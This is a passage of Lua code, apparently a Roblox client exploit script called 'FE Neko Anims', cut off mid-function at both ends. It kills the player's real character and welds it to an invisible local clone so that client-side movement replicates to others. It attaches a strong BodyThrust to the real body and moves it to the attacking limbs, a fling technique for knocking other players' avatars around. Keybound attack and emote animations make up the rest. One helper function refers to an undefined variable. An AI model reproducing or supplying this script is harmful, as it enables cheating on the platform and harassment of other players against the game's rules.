		if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

		FalseChar:Destroy()

		local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]

		local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
		local CONVEC
		local function VECTORUNIT()
			if HumanDied then CONVEC:Disconnect(); return end
			local lookVec = workspace.Camera.CFrame.lookVector
			local Root = CloneChar["HumanoidRootPart"]
			LVecPart.Position = Root.Position
			LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
		end
		CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

		local CONDOWN
		local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
		local function KEYDOWN(_,Processed) 
			if HumanDied then CONDOWN:Disconnect(); return end
			if Processed ~= true then
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = true end
				if Key == Enum.KeyCode.A then
					ADown = true end
				if Key == Enum.KeyCode.S then
					SDown = true end
				if Key == Enum.KeyCode.D then
					DDown = true end
				if Key == Enum.KeyCode.Space then
					SpaceDown = true end end end
		CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

		local CONUP
		local function KEYUP(_)
			if HumanDied then CONUP:Disconnect(); return end
			local Key = _.KeyCode
			if Key == Enum.KeyCode.W then
				WDown = false end
			if Key == Enum.KeyCode.A then
				ADown = false end
			if Key == Enum.KeyCode.S then
				SDown = false end
			if Key == Enum.KeyCode.D then
				DDown = false end
			if Key == Enum.KeyCode.Space then
				SpaceDown = false end end
		CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

		local function MoveClone(X,Y,Z)
			LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
			workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
		end

		coroutine.wrap(function() 
			while true do game:GetService("RunService").RenderStepped:Wait()
				if HumanDied then break end
				if WDown then MoveClone(0,0,1e4) end
				if ADown then MoveClone(1e4,0,0) end
				if SDown then MoveClone(0,0,-1e4) end
				if DDown then MoveClone(-1e4,0,0) end
				if SpaceDown then CloneChar["Humanoid"].Jump = true end
				if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
					workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
			end 
		end)()

		local con
		function UnCollide()
			if HumanDied then con:Disconnect(); return end
			for _,Parts in next, CloneChar:GetDescendants() do
				if Parts:IsA("BasePart") then
					Parts.CanCollide = false 
				end 
			end
			for _,Parts in next, DeadChar:GetDescendants() do
				if Parts:IsA("BasePart") then
					Parts.CanCollide = false
				end 
			end 
		end
		con = game:GetService("RunService").Stepped:Connect(UnCollide)

		local resetBindable = Instance.new("BindableEvent")
		resetBindable.Event:connect(function()
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
			resetBindable:Destroy()
			CloneChar.Humanoid.Health = 0
		end)
		game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

		coroutine.wrap(function()
			while true do
				game:GetService("RunService").RenderStepped:wait()
				if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 then 
					HumanDied = true
					pcall(function()
						game.Players.LocalPlayer.Character = CloneChar
						CloneChar:Destroy()
						game.Players.LocalPlayer.Character = DeadChar
						if resetBindable then
							game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
							resetBindable:Destroy()
						end
						DeadChar.Humanoid.Health = 0
					end)
					break
				end		
			end
		end)()

		for _,v in next, DeadChar:GetChildren() do
			if v:IsA("Accessory") then
				v:Clone().Parent = CloneChar
			end
		end

		SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["UpperTorso"],CloneChar["Torso"],Vector3.new(0,0.2,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LowerTorso"],CloneChar["Torso"],Vector3.new(0,-0.78,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LeftUpperArm"],CloneChar["Left Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LeftLowerArm"],CloneChar["Left Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LeftHand"],CloneChar["Left Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightUpperArm"],CloneChar["Right Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightLowerArm"],CloneChar["Right Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightHand"],CloneChar["Right Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))

		SCIFIMOVIELOL(DeadChar["LeftUpperLeg"],CloneChar["Left Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LeftLowerLeg"],CloneChar["Left Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LeftFoot"],CloneChar["Left Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightUpperLeg"],CloneChar["Right Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightLowerLeg"],CloneChar["Right Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightFoot"],CloneChar["Right Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))

		SCIFIMOVIELOL(DeadChar["HumanoidRootPart"],CloneChar["HumanoidRootPart"],Vector3.new(0,0,0),Vector3.new(0,0,0))

		for _,v in next, DeadChar:GetChildren() do
			if v:IsA("Accessory") then
				SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
			end
		end

		for _,BodyParts in next, CloneChar:GetDescendants() do
			if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
				BodyParts.Transparency = 1 end end
		if DeadChar.Head:FindFirstChild("Neck") then
			game.Players.LocalPlayer.Character:BreakJoints()
		end
	end
end
local CloneChar = workspace.non







ArtificialHB = Instance.new('BindableEvent', script)
ArtificialHB.Name = 'Heartbeat'
script:WaitForChild('Heartbeat')
frame = 1 / 60
tf = 0
allowframeloss = false
tossremainder = false
lastframe = tick()
script.Heartbeat:Fire()

game:GetService('RunService').Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			script.Heartbeat:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				script.Heartbeat:Fire()
			end
			lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)
local makesound = function(soundid,speed,volume,parent)
	local sound = Instance.new("Sound")
	sound.SoundId = soundid
	sound.RollOffMaxDistance = 100
	sound.PlaybackSpeed =speed 
	sound.Volume = volume
	sound.Parent = parent
	return sound
end
local Callerp = function(Start,End,Percent)
	return (Start - (End - Start) * Percen)
end
function swait(t)
	game:GetService('RunService').Stepped:wait()
end

local TweenService = game:GetService("TweenService")
local CF = CFrame.new
local CFA = CFrame.Angles
local head = CloneChar:WaitForChild("Head")
local tors = CloneChar:WaitForChild("Torso")
local huma = CloneChar:WaitForChild("Humanoid")
huma.DisplayName = " "
local neck = Instance.new("Weld",tors)
neck.Part0 = tors
neck.Part1 = head
neck.C0 = CF(0,1.5,0)
local nek = neck.C1
neck.Enabled = true
local root = CloneChar.HumanoidRootPart.RootJoint.C0
local rs = tors["Right Shoulder"].C0
local ls = tors["Left Shoulder"].C0
local rh = tors["Right Hip"].C0
local lh = tors["Left Hip"].C0
local RootPart = CloneChar:WaitForChild("HumanoidRootPart")
local Humanoid = CloneChar.Humanoid
local ActiveTracks = Humanoid:GetPlayingAnimationTracks()
Humanoid.JumpPower = 80
local Attacking = false
local AttackANVal = 1
local bambam = Instance.new("BodyThrust")
bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
bambam.Force = Vector3.new(1000,0,1000)
bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
rayCast = function(Pos, Dir, Max, Ignore)

	return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), (CloneChar and game.Players.LocalPlayer.Character))
end
Spawn(function()
	for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
		if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
			s = game:GetService("RunService").Heartbeat:connect(function()
				v.Velocity = Vector3.new(0,35,0)
				wait(0.3)
			end)
		end
	end
end)
spawn(function()
	repeat
		wait()
	until Humanoid.Health < 0.1
	s:Disconnect()
end)
if Tail ~= nil then
	TailWeld = Tail.AccessoryWeld

else
	TailWeld = Instance.new("Weld",workspace)
	Msgreq("FE Neko Anims V1.6","Loading Without Tail Accessory (Check top of script for the accessory)",5,nil)
end
local TC0 = TailWeld.C0 * CFrame.new(0,0,0.4)
local Song = Instance.new("Sound",RootPart)
Song.SoundId = SongID
Song.Looped = true
Song:Play()
local Running = false

local MakeTween = function(timetack,easingstyle,easingdirection,repeats,flipflop)
	local newtween = TweenInfo.new(
		timetack, 
		easingstyle, 
		easingdirection, 
		repeats, 
		flipflop, 
		0 
	)
	return newtween
end
local DOTWEEN = function(Part,tim,value)
	local Tween = MakeTween(tim,Enum.EasingStyle.Circular,Enum.EasingDirection.InOut,0,false)
	TweenService:Create(Part,Tween,{C0= value}):Play()
end
local LerpStyle = function(lerpmagnet,easingstyle,easingdirection)
	local newstyle = TweenService:GetValue(lerpmagnet,easingstyle,easingdirection)
	return newstyle
end

local SpinKick  = function()
	if Attacking == false then
		Attacking = true 
		for i = 0,60,1 do
			swait()
			neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(30),math.rad(0),math.rad(0)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-20)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-20 + -10)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-30 - -6)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
		end 
		bambam.Location = game.Players.LocalPlayer.Character.Torso.Position
		game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character.Torso.Position
		RootPart.Anchored = true
		for i = 0,60,1 do
			swait()
			RootPart.Position = RootPart.Position + Vector3.new(0,0.6,0)
			bambam.Location = game.Players.LocalPlayer.Character["Right Leg"].Position
			game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character.Torso.Position
			neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(-20 + -36*i),math.rad(0),math.rad(0)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.0,0,0) * CFA(math.rad(0),math.rad(30),math.rad(40)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(-30),math.rad(-40)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(50)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(30)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
		end 
		RootPart.Anchored = false
		Attacking = false
	end
end


local ComboCont = 1
local Attack = function()
	if Attacking == false then
		Attacking = true
		if ComboCont == 1 then
			for i = 0,10,1 do
				swait()
				bambam.Location = game.Players.LocalPlayer.Character["Right Arm"].Position
				game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Right Arm"].Position
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(-30),math.rad(0),math.rad(80)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.5,0,-1.2) * CFA(math.rad(0),math.rad(90),math.rad(90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(10)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(30)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			end 

			for i = 0,15,1 do
				swait()
				bambam.Location = game.Players.LocalPlayer.Character["Right Arm"].Position
				game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Right Arm"].Position
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,-3,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.5,0,0) * CFA(math.rad(0),math.rad(-85),math.rad(90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(40)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(30)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			end
			ComboCont = 2


		elseif ComboCont == 2 then
			for i = 0,10,1 do
				swait()
				bambam.Location = game.Players.LocalPlayer.Character["Left Arm"].Position
				game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Left Arm"].Position
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(90),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(-30),math.rad(0),math.rad(90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-12)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(10)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(30)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			end 

			for i = 0,10,1 do
				swait()
				bambam.Location = game.Players.LocalPlayer.Character["Left Arm"].Position
				game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Left Arm"].Position
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(-90),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,-3,0) * CFA(math.rad(0),math.rad(0),math.rad(-90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-12)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0.5) * CFA(math.rad(0),math.rad(90),math.rad(-90)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(10)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(30)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			end 
			ComboCont = 3
		elseif ComboCont == 3 then
			for i = 0,10,1 do
				swait()
				bambam.Location = game.Players.LocalPlayer.Character["Right Leg"].Position
				game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Left Arm"].Position
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(10),math.rad(0),math.rad(-50)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-5)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(8)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(-50),math.rad(-98)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(20),math.rad(0)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			end 

			for i = 0,15,1 do
				swait()
				bambam.Location = game.Players.LocalPlayer.Character["Right Leg"].Position
				game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character["Left Arm"].Position
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(90),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,-3,0) * CFA(math.rad(-40),math.rad(0),math.rad(90)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-5)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(8)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(90),math.rad(-90+40)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(-90),math.rad(0)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
			end 
			ComboCont = 1
		end
		Attacking = false
	end
end
local Mouse = game.Players.LocalPlayer:GetMouse()
local B1Hold = false
Mouse.Button1Down:Connect(function()
	B1Hold = true 
	while B1Hold == true do
		wait()
		Attack()
	end
end)
local Running = false
Mouse.Button1Up:Connect(function()
	B1Hold = false
end)
Mouse.KeyDown:Connect(function(key)
	if key == "z" then
		SpinKick()
	else
		if key == "t" and Attacking == false then
			Attacking = true
			makesound("rbxassetid://6433451653",1,1,tors):Play()
			for i=0,100 do
				swait()
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad( -15 + math.rad(math.sin(time()*16)*15)),0,0),LerpStyle(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(-10 +  math.sin(time()*16)*10),math.rad(0),math.rad(0)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0.4 + math.sin(time()*17)*0.4,0) * CFA(0,math.rad(90),math.rad(123)),LerpStyle(0.07*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(10),0,math.rad(-90)),LerpStyle(0.07*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(-30 + math.sin(time()*17)*20),math.rad(-10 +  math.sin(time()*16)*10)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(10 +  math.sin(time()*16)*-10)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				TailWeld.C0 = TailWeld.C0:Lerp(TC0 * CFrame.Angles(math.rad(-20 + math.sin(-time()*3.83)*-20),math.rad(-math.sin(time()*3.83/2)*24),0),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			end
			Attacking = false
		else
			if key == "r" and Attacking == false then
				Attacking = true
				while game.Players.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude < 0.1 do
					swait()
					game.Players.LocalPlayer.Character.HumanoidRootPart.Position = tors.Position
					neck.C1 = neck.C1:Lerp(nek * CF(0,-0.4,0) * CFA(math.rad(-90),math.rad(-math.cos(time()*3)*30),0),LerpStyle(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
					RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,-2.5) * CFA(math.rad(78),math.rad(math.sin(time()*3)*12),math.rad(math.rad(math.sin(time()*3)*40))),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.3,0.4 +0.4+math.sin(time()*3)*0.2,-0.4 -0.2+math.sin(time()*3)*0.2) * CFA(math.rad(-45)+math.rad(math.sin(time()*3)*12),math.rad(0),math.rad(180 - 10+math.cos(time()*3)*5)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-0.3,0.4+0.4-math.sin(time()*3)*0.2,-0.4 -0.2+math.sin(time()*3)*0.2) * CFA(math.rad(-45)-math.rad(math.sin(time()*3)*12),math.rad(0),math.rad(-180 + 10 +math.cos(time()*3)*5)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(-math.sin(time()*3)*12),math.rad(math.sin(time()*3)*30),math.rad(-12 - 50 + math.cos(time()*3)*30)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(-math.sin(time()*3)*12),math.rad(math.sin(time()*3)*30),math.rad(12 + 50 + math.cos(time()*3)*30)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					TailWeld.C0 = TailWeld.C0:Lerp(TC0 * CFrame.Angles(math.rad(0),0,math.rad(math.cos(time()*3)*40)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))

				end
				Attacking = false
			else if key == "f" then
					if Running == false then
						Running = true 
						Humanoid.WalkSpeed = 40
					else
						Running = false
						Humanoid.WalkSpeed = 20
					end
				elseif key == "x" and Attacking == false and Mouse.Target.Parent:FindFirstChildWhichIsA("Humanoid") ~= nil then
					Attacking = true
					Camera = workspace.CurrentCamera
					Camera.CameraType = "Scriptable"
					local Target = Mouse.Target.Parent
					for i = 0,200,1 do
						swait()
						Camera.CFrame = Camera.CFrame:Lerp(CFrame.new((head.CFrame * CFrame.new(0,0,-5)).Position,head.CFrame.Position),1)
						neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(20),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(20),math.rad(0),math.rad(0)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,-0.5,0) * CFA(math.rad(-25),math.rad(0),math.rad(00)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,-0.5,0) * CFA(math.rad(-25),math.rad(0),math.rad(00)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20+ -40)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-20+ -4)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					end

					for i = 0,20,1 do
						swait()
